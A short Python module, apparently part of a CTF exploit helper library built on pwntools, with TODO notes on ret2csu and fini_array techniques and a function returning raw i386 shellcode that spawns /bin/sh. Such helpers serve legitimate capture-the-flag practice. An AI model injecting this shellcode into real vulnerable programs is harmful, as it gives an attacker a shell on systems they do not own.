'''A dumping ground for some uncommon CTF-type exploits
that are repeated enough to justify existing as an
automated script.'''
# TODO: see if ret2csu can be done with pwntool's ROP, and if not...
# TODO: fini_arr.
from pwn import context
def sh():
    '''Shorter shellcode, in case program limits require it'''
    if context.arch == 'i386':
        return b'1\xc9\xf7\xe1\xb0\x0bQh//shh/bin\x89\xe3\xcd\x80'
    else: raise NotImplementedError
